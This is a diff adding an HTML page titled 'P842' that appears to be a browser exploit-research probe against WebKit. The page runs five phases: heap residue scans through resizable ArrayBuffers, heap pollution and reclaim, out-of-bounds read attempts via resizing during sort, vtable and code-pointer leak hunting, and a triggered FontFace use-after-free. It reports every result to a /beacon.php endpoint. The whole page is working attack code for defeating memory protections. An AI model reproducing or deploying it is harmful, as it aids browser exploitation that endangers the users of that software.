@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P842</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:12px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:6px;border-radius:4px;white-space:pre-wrap;word-break:break-all;max-height:92vh;overflow-y:auto;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P842: Resizable AB Heap Residue + Sort OOB + Vtable Leak</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P842-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+function hexQ(v){return '0x'+v.toString(16).padStart(12,'0');}
+function isKernPtr(hi){return hi>=0xFFFF8000;}
+function isCodePtr(hi,lo){return hi>0&&hi<0x8000&&lo>0;} /* Low hi = code/lib region */
+
+bn('BOOT','start');
+
+/* ===== PHASE A: Raw RAB heap residue scan ===== */
+log('--- Phase A: RAB Heap Residue Scan ---','hot');
+var phaseAResults={};
+try{
+  /* Test multiple RAB sizes to find one that lands on recycled memory */
+  var rabSizes=[
+    {init:64,max:4096},
+    {init:64,max:8192},
+    {init:64,max:16384},
+    {init:192,max:4096},
+    {init:192,max:8192},
+    {init:768,max:4096},
+    {init:768,max:8192}
+  ];
+
+  for(var si=0;si<rabSizes.length;si++){
+    var cfg=rabSizes[si];
+    var tag='RAB-'+cfg.init+'-'+cfg.max;
+    try{
+      var rab=new ArrayBuffer(cfg.init,{maxByteLength:cfg.max});
+      var u8=new Uint8Array(rab);
+
+      /* Check if initial region is zeroed */
+      var initNz=0;
+      for(var i=0;i<cfg.init;i++)if(u8[i]!==0)initNz++;
+
+      /* Resize to max */
+      rab.resize(cfg.max);
+
+      /* Scan expanded region for non-zero data */
+      var nzCount=0,nzBytes=[],ptrs=[];
+      var bu=new BigUint64Array(rab);
+      for(var i=0;i<bu.length;i++){
+        var v=bu[i];
+        if(v!==BigInt(0)){
+          nzCount++;
+          var hi=Number(v>>BigInt(32));
+          var lo=Number(v&BigInt(0xFFFFFFFF));
+          if(nzBytes.length<30)nzBytes.push('q'+i+'='+hexQ(v));
+          /* Check for pointer-like values */
+          if(hi>0&&hi<0x80000000){
+            ptrs.push('q'+i+'='+hexQ(v)+'(hi='+hi.toString(16)+')');
+          }
+          if(isKernPtr(hi)){
+            ptrs.push('q'+i+'=KERN:'+hexQ(v));
+          }
+        }
+      }
+
+      var result=tag+':initNz='+initNz+',expandNz='+nzCount+',ptrs='+ptrs.length;
+      log('  '+result+(nzCount>0?' '+nzBytes.slice(0,8).join(' '):''),'info');
+      if(ptrs.length>0){
+        log('  POINTERS: '+ptrs.slice(0,10).join(' '),'hot');
+      }
+      bn(tag,result+'|nz='+nzBytes.slice(0,15).join(',')+'|ptrs='+ptrs.slice(0,10).join(','));
+      phaseAResults[tag]={nzCount:nzCount,ptrs:ptrs};
+
+    }catch(e){
+      log('  '+tag+': ERROR '+e.message,'fail');
+      bn(tag+'-ERR',e.message);
+    }
+  }
+}catch(e){
+  log('Phase A error: '+e.message,'fail');
+  bn('A-ERR',e.message);
+}
+
+/* ===== PHASE B: Heap pollute then RAB reclaim ===== */
+log('','');
+log('--- Phase B: Heap Pollute → RAB Reclaim ---','hot');
+try{
+  /* Step 1: Create many CSS objects to fill heap with pointer-rich data */
+  var rules=[],sheets=[];
+  for(var i=0;i<200;i++){
+    var s=document.createElement('style');
+    s.textContent='.cls'+i+'{color:red;margin:'+i+'px;padding:'+i+'px;border:1px solid blue;font-size:'+(10+i%20)+'px;line-height:'+(1+i%3)+';letter-spacing:'+i%5+'px;}';
+    document.head.appendChild(s);
+    sheets.push(s);
+  }
+  /* Step 2: Create DOM nodes */
+  var nodes=[];
+  for(var i=0;i<500;i++){
+    var d=document.createElement('div');
+    d.className='cls'+i%200;
+    d.textContent='node'+i;
+    document.body.appendChild(d);
+    nodes.push(d);
+  }
+  /* Step 3: Force layout to populate internal structures */
+  document.body.offsetHeight;
+
+  /* Step 4: Remove everything to free internal WebKit objects */
+  for(var i=0;i<nodes.length;i++){
+    nodes[i].remove();
+  }
+  nodes=null;
+  for(var i=0;i<sheets.length;i++){
+    sheets[i].remove();
+    sheets[i].textContent='';
+  }
+  sheets=null;
+  rules=null;
+
+  /* Step 5: GC pressure */
+  var junk=[];
+  for(var i=0;i<3000;i++)junk.push({x:i,y:new ArrayBuffer(32)});
+  junk=null;
+  for(var i=0;i<2000;i++)(function(){return new ArrayBuffer(128);})();
+
+  /* Step 6: Now create RABs to reclaim freed WebKit memory */
+  var scanResults=[];
+  for(var ri=0;ri<10;ri++){
+    try{
+      var rab2=new ArrayBuffer(64,{maxByteLength:4096});
+      rab2.resize(4096);
+      var bu2=new BigUint64Array(rab2);
+      var nz2=0,ptrs2=[],bytes2=[];
+      for(var i=0;i<bu2.length;i++){
+        var v=bu2[i];
+        if(v!==BigInt(0)){
+          nz2++;
+          var hi=Number(v>>BigInt(32));
+          var lo=Number(v&BigInt(0xFFFFFFFF));
+          if(bytes2.length<15)bytes2.push('q'+i+'='+hexQ(v));
+          if((hi>0&&hi<0x1000)||isKernPtr(hi)){
+            ptrs2.push('q'+i+'='+hexQ(v));
+          }
+        }
+      }
+      if(nz2>0)scanResults.push('r'+ri+':nz='+nz2+',p='+ptrs2.length+','+bytes2.slice(0,5).join(' '));
+    }catch(e){}
+  }
+  if(scanResults.length>0){
+    log('Pollute+reclaim: '+scanResults.length+'/10 RABs had residue','hot');
+    for(var i=0;i<scanResults.length;i++)log('  '+scanResults[i],'info');
+    bn('POLLUTE',scanResults.join('||'));
+  } else {
+    log('Pollute+reclaim: 0/10 RABs had residue (all zeroed)','info');
+    bn('POLLUTE','all-zero');
+  }
+}catch(e){
+  log('Phase B error: '+e.message,'fail');
+  bn('B-ERR',e.message);
+}
+
+/* ===== PHASE C: Sort OOB Read via RAB resize-during-compare ===== */
+log('','');
+log('--- Phase C: Sort OOB via RAB Resize ---','hot');
+try{
+  /* Create RAB with data in expanded region, then shrink and sort */
+  var rabC=new ArrayBuffer(1024,{maxByteLength:1024});
+  var f64C=new Float64Array(rabC);
+
+  /* Fill with recognizable pattern */
+  for(var i=0;i<f64C.length;i++)f64C[i]=1000+i;
+
+  /* Create a TypedArray view that might read stale length */
+  var viewC=new Float64Array(rabC);
+
+  /* Shrink the RAB in a sort comparator */
+  var sortCalls=0,oobValues=[];
+  var shrinkOnce=false;
+
+  try{
+    var arr=Array.from(viewC);
+    /* Sort with comparator that resizes */
+    arr.sort(function(a,b){
+      sortCalls++;
+      if(!shrinkOnce&&sortCalls>5){
+        shrinkOnce=true;
+        try{rabC.resize(64);}catch(e){}
+      }
+      return a-b;
+    });
+    log('Sort completed: '+sortCalls+' comparisons, shrunk='+shrinkOnce,'info');
+    bn('SORT-ARRAY','calls='+sortCalls+'|shrunk='+shrinkOnce);
+  }catch(e){
+    log('Array.sort: '+e.message,'info');
+  }
+
+  /* Now try with TypedArray.sort directly on RAB-backed view */
+  var rabC2=new ArrayBuffer(512,{maxByteLength:2048});
+  rabC2.resize(2048);
+  var f64C2=new Float64Array(rabC2);
+  for(var i=0;i<f64C2.length;i++)f64C2[i]=2000-i;
+
+  /* Put sentinel data past 512 */
+  for(var i=64;i<f64C2.length;i++)f64C2[i]=-(i+0.1234);
+
+  /* Shrink to 512, then sort */
+  rabC2.resize(512);
+  var viewC2=new Float64Array(rabC2);
+  var sortCalls2=0,resizedDuring=false;
+
+  try{
+    /* Direct TypedArray.sort on RAB view */
+    viewC2.sort(function(a,b){
+      sortCalls2++;
+      if(!resizedDuring&&sortCalls2>3){
+        resizedDuring=true;
+        try{
+          rabC2.resize(2048); /* Grow back — does sort see old data? */
+        }catch(e){}
+      }
+      return a-b;
+    });
+
+    /* After sort, check if we can see the sentinel data */
+    var postSort=[];
+    var newView=new Float64Array(rabC2);
+    for(var i=0;i<newView.length;i++){
+      if(newView[i]<-50){
+        postSort.push('i'+i+'='+newView[i].toFixed(2));
+      }
+    }
+    log('TypedArray sort: '+sortCalls2+' comps, resized='+resizedDuring+', sentinels='+postSort.length,'info');
+    if(postSort.length>0)log('  Sentinel data survived: '+postSort.slice(0,10).join(' '),'hot');
+    bn('TASORT','calls='+sortCalls2+'|resized='+resizedDuring+'|sentinels='+postSort.length+'|vals='+postSort.slice(0,8).join(','));
+  }catch(e){
+    log('TypedArray sort: '+e.message,'info');
+    bn('TASORT-ERR',e.message);
+  }
+
+  /* Slice stale length test */
+  var rabC3=new ArrayBuffer(1024,{maxByteLength:2048});
+  rabC3.resize(2048);
+  var u8C3=new Uint8Array(rabC3);
+  for(var i=1024;i<2048;i++)u8C3[i]=0xDD; /* Sentinel in upper half */
+  rabC3.resize(1024); /* Shrink */
+
+  try{
+    var sliced=new Uint8Array(rabC3).slice(0); /* Slice the current view */
+    var ddCount=0;
+    for(var i=0;i<sliced.length;i++)if(sliced[i]===0xDD)ddCount++;
+    log('Slice test: len='+sliced.length+' ddBytes='+ddCount,'info');
+    bn('SLICE','len='+sliced.length+'|dd='+ddCount);
+  }catch(e){
+    log('Slice: '+e.message,'info');
+  }
+
+}catch(e){
+  log('Phase C error: '+e.message,'fail');
+  bn('C-ERR',e.message);
+}
+
+/* ===== PHASE D: FontFace UAF + RAB combo — vtable leak attempt ===== */
+log('','');
+log('--- Phase D: FontFace UAF + RAB Vtable Leak ---','hot');
+
+/* Strategy: Free many CSS objects, then use RAB to scan heap for vtable residue */
+/* First, create objects that HAVE vtables (virtual C++ classes) */
+try{
+  /* Create many Event objects (have vtable), FontFace objects, etc. */
+  var events=[];
+  for(var i=0;i<300;i++){
+    events.push(new Event('ev'+i));
+    events.push(document.createEvent('Event'));
+  }
+  /* Create canvas contexts (have vtable, ~768B) */
+  var ctxs=[];
+  for(var i=0;i<50;i++){
+    var c=document.createElement('canvas');
+    c.width=1;c.height=1;
+    ctxs.push(c.getContext('2d'));
+  }
+  /* Create CSS animations */
+  var anims=[];
+  for(var i=0;i<100;i++){
+    var d=document.createElement('div');
+    d.style.cssText='width:10px;height:10px;position:absolute;';
+    document.body.appendChild(d);
+    try{
+      var a=d.animate([{opacity:0},{opacity:1}],{duration:1000,iterations:1});
+      anims.push({d:d,a:a});
+    }catch(e){break;}
+  }
+
+  /* Free everything */
+  events.length=0;events=null;
+  for(var i=0;i<ctxs.length;i++){
+    try{ctxs[i].canvas.remove();}catch(e){}
+  }
+  ctxs.length=0;ctxs=null;
+  for(var i=0;i<anims.length;i++){
+    try{anims[i].a.cancel();anims[i].d.remove();}catch(e){}
+  }
+  anims=null;
+
+  /* GC pressure */
+  for(var i=0;i<5000;i++)(function(){return {x:new ArrayBuffer(256)};})();
+
+  /* Now create RABs to scan freed memory */
+  var vtableHits=[],heapHits=[],allNz=0;
+  for(var ri=0;ri<20;ri++){
+    try{
+      var rabD=new ArrayBuffer(64,{maxByteLength:2048});
+      rabD.resize(2048);
+      var buD=new BigUint64Array(rabD);
+      for(var i=0;i<buD.length;i++){
+        var v=buD[i];
+        if(v!==BigInt(0)){
+          allNz++;
+          var hi=Number(v>>BigInt(32));
+          var lo=Number(v&BigInt(0xFFFFFFFF));
+          /* Code/lib pointer: hi in range 0x1-0x7FFF, lo nonzero */
+          if(hi>0&&hi<0x8000&&lo>0x1000){
+            vtableHits.push('r'+ri+',q'+i+'='+hexQ(v));
+          }
+          /* Heap pointer: hi in range 0x1000x-0x100xx */
+          if(hi>=0x10000&&hi<0x20000){
+            heapHits.push('r'+ri+',q'+i+'='+hexQ(v));
+          }
+          /* Kernel pointer */
+          if(hi>=0xFFFF8000){
+            vtableHits.push('r'+ri+',q'+i+'=KERN:'+hexQ(v));
+          }
+        }
+      }
+    }catch(e){}
+  }
+
+  log('Vtable scan: '+allNz+' nonzero qwords across 20 RABs','info');
+  if(vtableHits.length>0){
+    log('CODE POINTER CANDIDATES:','hot');
+    for(var i=0;i<Math.min(vtableHits.length,15);i++)log('  '+vtableHits[i],'hot');
+    bn('VTABLE-HITS','count='+vtableHits.length+'|'+vtableHits.slice(0,10).join(','));
+  } else {
+    log('Zero code pointer candidates','info');
+    bn('VTABLE-HITS','zero');
+  }
+  if(heapHits.length>0){
+    log('Heap pointers: '+heapHits.length+' found','info');
+    bn('HEAP-HITS','count='+heapHits.length+'|'+heapHits.slice(0,10).join(','));
+  }
+}catch(e){
+  log('Phase D error: '+e.message,'fail');
+  bn('D-ERR',e.message);
+}
+
+/* ===== PHASE E: FontFace UAF into RAB backing store ===== */
+log('','');
+log('--- Phase E: FontFace UAF + RAB Overlap Test ---','hot');
+
+/* Can we place the CSSFontFace (192B) INSIDE a RAB's backing store range? */
+/* Create RABs first, then trigger UAF, check if any RAB sees the residue */
+try{
+  /* Create many RABs with max=4096 */
+  var rabs=[];
+  for(var i=0;i<30;i++){
+    try{
+      var r=new ArrayBuffer(64,{maxByteLength:4096});
+      rabs.push(r);
+    }catch(e){break;}
+  }
+  log('Created '+rabs.length+' RABs','info');
+
+  /* Now trigger FontFace UAF */
+  var stE=document.createElement('style');
+  stE.textContent="@font-face{font-family:bbE;src:local(Arial);unicode-range:U+0045;}";
+  document.head.appendChild(stE);
+  var faceE=new FontFace('fE',"local('Helvetica')",{unicodeRange:'U+0045'});
+  document.fonts.add(faceE);
+  void faceE.loaded;
+
+  var ffiredE=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(ffiredE)return undefined;
+      ffiredE=true;
+      if(stE){stE.remove();stE.textContent='';stE=null;}
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },set:function(){}
+  });
+  document.fonts.load('1em fE, bbE','EF');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    /* Resize all RABs and scan for CSSFontFace residue */
+    var found=false;
+    for(var i=0;i<rabs.length;i++){
+      try{
+        rabs[i].resize(4096);
+        var bu=new BigUint64Array(rabs[i]);
+        for(var j=8;j<bu.length;j++){ /* Skip initial 64B which are ours */
+          var v=bu[j];
+          if(v!==BigInt(0)){
+            var hi=Number(v>>BigInt(32));
+            /* Look for the characteristic q11/q13 pattern */
+            if(hi>=0x10000&&hi<0x20000){
+              log('RAB['+i+'] q'+j+'='+hexQ(v)+' — HEAP PTR in expanded region!','hot');
+              bn('RAB-OVERLAP','rab='+i+',q='+j+',v='+hexQ(v));
+              found=true;
+            }
+          }
+        }
+      }catch(e){}
+    }
+    if(!found){
+      log('No CSSFontFace residue found in RAB expanded regions','info');
+      bn('RAB-OVERLAP','none');
+    }
+
+    /* ===== FINAL: Summary ===== */
+    log('','');
+    log('====== P842 COMPLETE ======','hot');
+    bn('DONE','phases=ABCDE');
+  },300);
+
+}catch(e){
+  log('Phase E error: '+e.message,'fail');
+  bn('E-ERR',e.message);
+  log('','');
+  log('====== P842 COMPLETE ======','hot');
+  bn('DONE','phases=ABCD');
+}
+</script></body></html>
